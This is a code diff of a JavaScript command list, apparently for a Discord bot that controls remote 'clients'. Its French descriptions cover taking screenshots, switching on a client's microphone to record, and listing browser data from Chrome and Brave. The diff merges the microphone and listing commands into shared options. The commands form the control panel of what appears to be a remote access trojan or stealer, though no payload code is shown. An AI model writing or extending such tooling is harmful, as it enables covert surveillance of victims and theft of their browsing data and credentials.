@@ -29,32 +29,20 @@ export const commands = [
                         value: 'screenshot',
                     },
                     {
-                        name: 'browserdata',
-                        value: 'browserdata',
+                        name: 'microphone',
+                        value: 'microphone',
                     },
                     {
                         name: 'stop',
                         value: 'stop',
                     },
                 ],
-            }
-        ],
-    },
-    {
-        name: 'microphone',
-        description: 'Envoie une commande pour activer le microphone d\'un client spécifique.',
-        options: [
-            {
-                name: 'client_id',
-                description: 'Le numéro du client.',
-                type: 3,
-                required: true,
             },
             {
                 name: 'duration',
-                description: 'La durée de l\'enregistrement en secondes.',
+                description: 'La durée de l\'enregistrement en secondes (uniquement pour le microphone). Par défaut, 10 secondes.',
                 type: 4,
-                required: true,
+                required: false,
             }
         ],
     },
@@ -81,37 +69,28 @@ export const commands = [
         ],
     },
     {
-        name: 'listallscreenshots',
-        description: 'Liste de toutes les captures d\'écran.',
-    },
-    {
-        name: 'listallmicrophones',
-        description: 'Liste de tous les enregistrements audio.',
-    },
-    {
-        name: 'listbrowserdata',
-        description: 'Envoie une commande pour lister les données de navigation d\'un client spécifique.',
+        name: 'listdata',
+        description: 'Liste les données spécifiques pour un client.',
         options: [
             {
-                name: 'client_id',
-                description: 'Le numéro du client.',
-                type: 3,
-                required: true,
-            },
-            {
-                name: 'browser',
-                description: 'Le navigateur à cibler.',
+                name: 'type',
+                description: 'Type de données à lister.',
                 type: 3,
                 required: true,
                 choices: [
-                    {
-                        name: 'Google Chrome',
-                        value: 'google-chrome',
-                    },
-                    {
-                        name: 'Brave',
-                        value: 'brave',
-                    }
+                    { name: 'Captures d\'écran', value: 'screenshot' },
+                    { name: 'Enregistrements audio', value: 'microphone' },
+                    { name: 'Données de navigation', value: 'browserdata' }
+                ],
+            },
+            {
+                name: 'browser',
+                description: 'Le navigateur à cibler (uniquement pour les données de navigation).',
+                type: 3,
+                required: false,
+                choices: [
+                    { name: 'Google Chrome', value: 'google-chrome' },
+                    { name: 'Brave', value: 'brave' },
                 ],
             },
         ],
